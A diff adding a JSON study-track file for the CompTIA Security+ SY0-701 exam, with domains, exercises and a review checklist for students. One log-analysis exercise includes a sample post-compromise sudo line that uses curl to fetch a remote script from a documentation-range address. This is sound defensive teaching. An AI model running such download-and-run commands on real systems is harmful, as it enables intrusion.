@@ -1,0 +1,179 @@
+{
+  "slug": "security-plus",
+  "name": "CompTIA Security+",
+  "examCode": "SY0-701",
+  "examVersionLabel": "V7 (SY0-701)",
+  "verifiedOn": "2026-09-15",
+  "verificationNote": "Checked against comptia.org on 2026-09-15: the current CompTIA Security+ exam is SY0-701 (V7), launched November 7, 2023. CompTIA lists the English-language retirement of SY0-701 as June 11, 2027. The domain names and weights, question count, time limit and passing score in this track were taken from the official page on that date. A successor exam (SY0-801) has been announced; third-party sources point to a planned launch in late 2026, but SY0-801 was not available on 2026-09-15 and no launch date had been officially confirmed. Before you schedule, open the official page, confirm which exam code is currently offered, make sure your study material matches that code, and re-check the SY0-701 retirement date. If SY0-801 is live when you read this, tell an officer so this track can be reviewed.",
+  "officialUrl": "https://www.comptia.org/certifications/security",
+  "objectivesUrl": "https://www.comptia.org/certifications/security#examdetails",
+  "overview": "CompTIA Security+ is a vendor-neutral, entry-level certification that checks whether you understand the core ideas of security work: how attacks happen, how organizations defend themselves, how to read what monitoring tools are telling you, and how security decisions connect to risk, policy and compliance. The current exam, **SY0-701**, is organized into five domains that run from general concepts and cryptography through architecture, day-to-day operations and incident response, to governance and risk.\n\nFor a college student it is a useful foundation for three reasons. First, it forces you to learn the shared vocabulary that appears in job postings, interviews and later certifications. Second, its breadth mirrors what most first roles actually involve: some networking, some identity, some cryptography, and a lot of operations. Third, many employers recognize it, and it is accepted for some U.S. Department of Defense work roles, so it can help a resume get past an initial screen.\n\nIt is not required for every security role, and holding it does not guarantee a job or an interview. Treat it as one piece of a portfolio alongside labs, projects and club activity. The lessons and practice questions here are free; use them whether or not you decide to sit the exam.",
+  "whoItsFor": "Students who want a broad, vendor-neutral security foundation: anyone aiming at SOC analyst, IT support, systems administration or GRC-adjacent roles, or who wants shared vocabulary before specializing. You should be comfortable with basic networking (IP addresses, ports, DNS) and everyday operating system tasks. CompTIA recommends Network+ and about two years in a security or systems administration role, but this is a recommendation, not a requirement; many students pass earlier with focused study.",
+  "examFormat": {
+    "questions": "Up to 90 questions (multiple choice and performance-based)",
+    "duration": "90 minutes",
+    "passingScore": "750 on a scale of 100-900",
+    "note": "Performance-based questions (PBQs) are interactive scenarios, often placed at the start of the exam; many candidates flag them and return to them after the multiple-choice items. These details were checked on comptia.org on 2026-09-15; confirm them on the official page before you book."
+  },
+  "costNote": "Studying with these lessons and practice questions is free. Taking the exam is not: the voucher price is set by CompTIA and changes over time, so check the official page for the current amount rather than trusting any number you see elsewhere. Exam vouchers, retakes and study bundles are separate costs. The CompTIA Academic Store may offer discounted student pricing to people with a valid student email address; verify eligibility on comptia.org before buying anything, and ask an officer whether the club or the department has any voucher support this semester.",
+  "domains": [
+    {
+      "id": "general-security-concepts",
+      "name": "General Security Concepts",
+      "weightPercent": 12,
+      "topics": [
+        "Security control categories (technical, managerial, operational, physical) and types (preventive, deterrent, detective, corrective, compensating, directive)",
+        "The CIA triad, non-repudiation and AAA (authentication, authorization, accounting)",
+        "Gap analysis and zero trust: control plane (policy engine, policy administrator) and data plane (policy enforcement point, implicit trust zones)",
+        "Physical security controls and deception technologies (honeypots, honeynets, honeyfiles, honeytokens)",
+        "Change management: approval, ownership, impact analysis, backout plans, maintenance windows, documentation and version control",
+        "Cryptographic building blocks: symmetric and asymmetric encryption, hashing, salting, key stretching, digital signatures, key exchange",
+        "Public key infrastructure: certificates, certificate authorities, CSRs, trust chains and revocation (CRL, OCSP)",
+        "Encryption levels and tools: full-disk, file, database and transport encryption; TPM, HSM, key management; obfuscation, tokenization and masking"
+      ]
+    },
+    {
+      "id": "threats-vulnerabilities-and-mitigations",
+      "name": "Threats, Vulnerabilities, and Mitigations",
+      "weightPercent": 22,
+      "topics": [
+        "Threat actors (nation-state, organized crime, hacktivist, insider, unskilled attacker, shadow IT) and their motivations, resources and sophistication",
+        "Threat vectors and attack surfaces: email and messaging, removable media, vulnerable or unsupported software, open service ports, default credentials, unsecure networks, supply chain",
+        "Social engineering: phishing, vishing, smishing, pretexting, impersonation, business email compromise, watering hole, brand impersonation, typosquatting, misinformation",
+        "Vulnerability types: memory-safety bugs, injection, race conditions, misconfiguration, zero-day, legacy and end-of-life systems, virtualization, cloud, supply chain, mobile",
+        "Malware and its indicators: ransomware, trojans, worms, spyware, keyloggers, rootkits, logic bombs, fileless malware",
+        "Attack indicators: brute force, password spraying, DDoS, DNS attacks, on-path, credential replay, injection, privilege escalation, directory traversal, downgrade",
+        "Mitigation techniques: segmentation, access control lists, application allow lists, isolation, patching, encryption, monitoring, least privilege, configuration enforcement, decommissioning, hardening"
+      ]
+    },
+    {
+      "id": "security-architecture",
+      "name": "Security Architecture",
+      "weightPercent": 18,
+      "topics": [
+        "Architecture models and their security implications: cloud (responsibility matrix, hybrid, third-party vendors), infrastructure as code, serverless, microservices, on-premises, virtualization and containers",
+        "Special-purpose systems: IoT, ICS/SCADA, embedded and real-time operating systems, and high-availability designs",
+        "Securing infrastructure: device placement, security zones, attack surface reduction, failure modes (fail-open versus fail-closed), inline versus tap/monitor",
+        "Network appliances and controls: firewalls (stateful, next-generation, WAF, UTM), IDS/IPS, load balancers, proxies, jump servers, sensors, port security and 802.1X",
+        "Secure communication and access: VPN (IPsec and TLS), tunneling, SD-WAN, SASE, remote access",
+        "Data protection: data types and classifications, data states (at rest, in transit, in use), sovereignty and geolocation, encryption, hashing, masking, tokenization, obfuscation, segmentation",
+        "Resilience and recovery: high availability, hot/warm/cold sites, platform diversity, multi-cloud, continuity of operations, capacity planning, testing (tabletop, failover, simulation, parallel processing), backups and power"
+      ]
+    },
+    {
+      "id": "security-operations",
+      "name": "Security Operations",
+      "weightPercent": 28,
+      "topics": [
+        "Secure baselines and hardening targets: workstations, servers, switches and routers, mobile devices, cloud infrastructure, ICS/SCADA, embedded and IoT devices",
+        "Wireless and mobile security: WPA3, AAA/RADIUS, EAP, site surveys, mobile device management, BYOD/COPE/CYOD",
+        "Asset management: acquisition, assignment, inventory and tracking, disposal and decommissioning (sanitization, destruction, certification, data retention)",
+        "Vulnerability management: identification (scans, penetration testing, responsible disclosure, bug bounties), analysis (CVSS, CVE, false positives, exposure), remediation (patching, compensating controls, exceptions), validation and reporting",
+        "Alerting and monitoring: SIEM, agents and agentless collection, SNMP traps, NetFlow, benchmarks and SCAP, log aggregation, archiving, alert tuning",
+        "Enterprise capabilities: firewall rules, IDS/IPS signatures, web and DNS filtering, secure protocols, email security (SPF, DKIM, DMARC), file integrity monitoring, DLP, NAC, EDR/XDR, user behavior analytics",
+        "Identity and access management: provisioning and deprovisioning, federation and SSO (SAML, OAuth, OpenID Connect), multifactor authentication, password practices, privileged access management, access control models",
+        "Automation and orchestration, the incident response process (preparation, detection, analysis, containment, eradication, recovery, lessons learned), digital forensics basics and investigation data sources"
+      ]
+    },
+    {
+      "id": "security-program-management-and-oversight",
+      "name": "Security Program Management and Oversight",
+      "weightPercent": 20,
+      "topics": [
+        "Governance documents: policies (acceptable use, information security, business continuity, disaster recovery, incident response, SDLC, change management), standards, procedures and guidelines",
+        "Governance structures and roles: boards, committees, government entities, centralized versus decentralized; data owners, controllers, processors, custodians and stewards",
+        "Risk management: identification, assessment types, qualitative and quantitative analysis (SLE, ARO, ALE, exposure factor), risk register, appetite and tolerance, treatment strategies (mitigate, accept, transfer, avoid), reporting",
+        "Business impact analysis: recovery time objective, recovery point objective, mean time to repair, mean time between failures",
+        "Third-party risk: vendor assessment and due diligence, conflicts of interest, agreement types (SLA, MOA, MOU, MSA, SOW, NDA, BPA), monitoring, questionnaires, rules of engagement",
+        "Compliance and privacy: reporting, consequences of non-compliance, attestation, data subjects, controllers versus processors, data inventory and retention, right to be forgotten",
+        "Audits and assessments: attestation, internal and external audits, penetration testing types (physical, offensive, defensive, integrated), known versus unknown environments, reconnaissance",
+        "Security awareness: phishing simulations and reporting, anomalous behavior recognition, user guidance and training, insider threat, password management, removable media, remote and hybrid work"
+      ]
+    }
+  ],
+  "lessons": [
+    "security-concepts-and-the-cia-triad",
+    "threat-actors-and-attack-surfaces",
+    "vulnerabilities-malware-and-indicators",
+    "cryptography-and-pki-basics",
+    "identity-and-access-controls",
+    "secure-architecture-and-network-defenses",
+    "security-operations-and-monitoring",
+    "incident-response-and-forensics-basics",
+    "vulnerability-management-and-hardening",
+    "governance-risk-and-compliance-basics"
+  ],
+  "practicalExercises": [
+    {
+      "title": "Hash a file and prove a one-byte change is visible",
+      "domainId": "general-security-concepts",
+      "body": "Create a small text file. Hash it with `certutil -hashfile notes.txt SHA256` (Windows), `shasum -a 256 notes.txt` (macOS) or `sha256sum notes.txt` (Linux). Change a single character, hash again and compare the two digests. Then find a download that publishes a SHA-256 checksum (many Linux distributions and open-source tools do) and verify a file you have already downloaded. Write two sentences on which part of the CIA triad this protects and what it does not protect against (hint: an attacker who can change both the file and the published checksum)."
+    },
+    {
+      "title": "Inspect a TLS certificate in your browser",
+      "domainId": "general-security-concepts",
+      "body": "Open any HTTPS site you already use, click the padlock or site-information icon, and view the certificate. Record the subject name, the Subject Alternative Names, the issuer, the validity dates, the signature algorithm and the chain from the site certificate up through the intermediate to the root. Find where the browser gets revocation information (CRL or OCSP URLs in the details). Then open your operating system's or browser's root certificate store and locate that root. Write down what would break if the intermediate certificate expired. Optional: https://badssl.com/ is a public test site built to show expired, self-signed and mismatched certificates safely."
+    },
+    {
+      "title": "Review your own firewall rules",
+      "domainId": "security-architecture",
+      "body": "On Windows, open Windows Security > Firewall & network protection, or run `Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | Select-Object DisplayName, Profile` in PowerShell. On macOS, open System Settings > Network > Firewall. On Linux, run `sudo ufw status verbose` or `sudo nft list ruleset`. List every inbound allow rule, and for each one write which program or service needs it and whether it should apply on public networks. Do not delete anything you do not understand; the goal is to explain each rule, note which profile (private, public, domain) it applies to, and identify one rule you would ask about if this were a work laptop."
+    },
+    {
+      "title": "Triage a suspicious email safely",
+      "domainId": "threats-vulnerabilities-and-mitigations",
+      "body": "Use a message you already received and reported as phishing, or write a realistic fake one yourself; never forward real phishing to other people. Open the message headers (most clients have a 'show original' or 'view source' option) and compare the From address with Reply-To and Return-Path. Find the Authentication-Results line and note the SPF, DKIM and DMARC results. Hover over every link without clicking and compare the visible text to the real destination. List the pressure cues (urgency, authority, unusual payment request) and finish with a three-line write-up: what it is, what it wanted, and what the safe response is."
+    },
+    {
+      "title": "Read a sample authentication log excerpt",
+      "domainId": "security-operations",
+      "body": "Copy this excerpt into a text file and analyze it without any tools: `Sep 14 02:11:03 web1 sshd[2231]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2` / `Sep 14 02:11:05 web1 sshd[2233]: Failed password for root from 203.0.113.45 port 51130 ssh2` / `Sep 14 02:11:06 web1 sshd[2235]: Failed password for invalid user test from 203.0.113.45 port 51137 ssh2` / `Sep 14 02:11:44 web1 sshd[2290]: Accepted password for deploy from 203.0.113.45 port 51420 ssh2` / `Sep 14 02:12:10 web1 sudo: deploy : TTY=pts/0 ; COMMAND=/usr/bin/curl http://203.0.113.9/x.sh`. Write down: the source address, the time window (and why you should check the server's time zone), the pattern of attempts, the moment the picture changes, and the single best next step for a responder. The 203.0.113.0/24 range is reserved for documentation, so nothing here points at a real system."
+    },
+    {
+      "title": "Draft a mini risk register for a fictional student organization",
+      "domainId": "security-program-management-and-oversight",
+      "body": "Invent a student club (for example a robotics club) with five assets: a member roster spreadsheet, a shared cloud drive, a Discord server, a club bank card, and a small website. For each asset, write at least one risk with a likelihood (1-3), an impact (1-3), an owner (an officer role), a treatment strategy (mitigate, accept, transfer or avoid) and one concrete control. Add a column for a key risk indicator you could actually observe (for example 'number of officers without MFA'). Finish by ranking the risks by likelihood times impact and writing one sentence about which risk you would bring to the club's next meeting."
+    },
+    {
+      "title": "Audit the authentication on your own accounts",
+      "domainId": "security-operations",
+      "body": "Make a private list of the accounts that matter most to you (university login, email, bank, password manager, cloud storage). For each one, record which second factor is enabled (none, SMS, authenticator app, push, hardware key or passkey), whether you can review active sessions and sign out of old ones, and whether recovery options (backup codes, recovery email) are current. Upgrade at least one account from SMS or nothing to an authenticator app, passkey or security key, and store the backup codes somewhere safe and offline. Write one line on why SMS is weaker and one on what a phishing-resistant factor means."
+    }
+  ],
+  "reviewChecklist": [
+    { "id": "cia-examples", "text": "I can give a concrete example of a confidentiality, an integrity and an availability failure and name a control for each.", "domainId": "general-security-concepts" },
+    { "id": "control-category-and-type", "text": "I can classify a control by category (technical, managerial, operational, physical) and by type (preventive, deterrent, detective, corrective, compensating, directive).", "domainId": "general-security-concepts" },
+    { "id": "zero-trust-planes", "text": "I can explain zero trust and say which components sit in the control plane and which in the data plane.", "domainId": "general-security-concepts" },
+    { "id": "change-management-elements", "text": "I can list the elements of a change request (approval, impact analysis, test results, backout plan, maintenance window) and explain why security cares.", "domainId": "general-security-concepts" },
+    { "id": "crypto-choices", "text": "I can say when to use symmetric encryption, asymmetric encryption, hashing and digital signatures, and explain salting and key stretching.", "domainId": "general-security-concepts" },
+    { "id": "pki-validation", "text": "I can describe what a browser checks when validating a certificate and what CAs, CSRs, CRLs and OCSP are for.", "domainId": "general-security-concepts" },
+    { "id": "threat-actor-motivations", "text": "I can match each threat actor type to a likely motivation and level of resources.", "domainId": "threats-vulnerabilities-and-mitigations" },
+    { "id": "social-engineering-recognition", "text": "I can recognize phishing, vishing, smishing, pretexting, business email compromise and watering hole attacks from a short description.", "domainId": "threats-vulnerabilities-and-mitigations" },
+    { "id": "malware-and-attack-indicators", "text": "I can identify ransomware, worms, trojans, rootkits, brute force, password spraying, DDoS, on-path and injection attacks from their indicators.", "domainId": "threats-vulnerabilities-and-mitigations" },
+    { "id": "mitigation-matching", "text": "I can name an appropriate mitigation (segmentation, allow lists, patching, least privilege, isolation, hardening) for each attack type I recognize.", "domainId": "threats-vulnerabilities-and-mitigations" },
+    { "id": "shared-responsibility", "text": "I can explain the cloud shared responsibility model and what remains the customer's job in IaaS, PaaS and SaaS.", "domainId": "security-architecture" },
+    { "id": "device-placement", "text": "I can place firewalls, IDS/IPS, load balancers, proxies, jump servers and VPN endpoints in a simple diagram and explain fail-open versus fail-closed.", "domainId": "security-architecture" },
+    { "id": "data-protection-methods", "text": "I can compare encryption, hashing, masking, tokenization and segmentation as data protection methods and name the three data states.", "domainId": "security-architecture" },
+    { "id": "resilience-sites-and-backups", "text": "I can compare hot, warm and cold sites, describe backup strategies, and explain how RTO and RPO drive those choices.", "domainId": "security-architecture" },
+    { "id": "mfa-and-access-models", "text": "I can classify authentication factors, say which combinations are real MFA, and compare DAC, MAC, RBAC, ABAC and rule-based access control.", "domainId": "security-operations" },
+    { "id": "log-pipeline-and-tools", "text": "I can trace a log from source to SIEM alert and explain what EDR/XDR, DLP, NAC, FIM, SPF, DKIM and DMARC do.", "domainId": "security-operations" },
+    { "id": "incident-response-phases", "text": "I can name the incident response phases in order, give an example action for each, and explain chain of custody and order of volatility.", "domainId": "security-operations" },
+    { "id": "vulnerability-management-cycle", "text": "I can describe the vulnerability management cycle, read a CVSS score, explain false positives, and list hardening steps for a workstation.", "domainId": "security-operations" },
+    { "id": "policy-standard-procedure", "text": "I can tell a policy, a standard, a procedure and a guideline apart and name the common security policies an organization keeps.", "domainId": "security-program-management-and-oversight" },
+    { "id": "risk-math-and-strategies", "text": "I can compute SLE, ARO and ALE, define RTO, RPO, MTTR and MTBF, and match mitigate, accept, transfer and avoid to examples.", "domainId": "security-program-management-and-oversight" },
+    { "id": "third-party-and-compliance", "text": "I can explain vendor due diligence, the common agreement types (SLA, MOU, MSA, SOW, NDA), and the difference between a data controller and a data processor.", "domainId": "security-program-management-and-oversight" },
+    { "id": "awareness-and-audits", "text": "I can describe how a phishing awareness program is run and measured, and compare internal audits, external audits and penetration test types.", "domainId": "security-program-management-and-oversight" }
+  ],
+  "courseMapping": {
+    "note": "Intended to map the GSU Intro to Security course to SY0-701 objectives, lessons and labs. Rows are intentionally empty until an officer reviews the current course syllabus against the current exam objectives; do not populate from memory.",
+    "rows": []
+  },
+  "status": "published",
+  "lastReviewed": "2026-09-15",
+  "sources": [
+    { "title": "CompTIA Security+ official page (exam details, objectives, retirement dates)", "url": "https://www.comptia.org/certifications/security", "note": "Checked 2026-09-15. Re-check the current exam code and retirement date before scheduling." },
+    { "title": "NIST Cybersecurity Framework 2.0", "url": "https://www.nist.gov/cyberframework" },
+    { "title": "NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management", "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final" },
+    { "title": "CISA Known Exploited Vulnerabilities Catalog", "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog" }
+  ]
+}
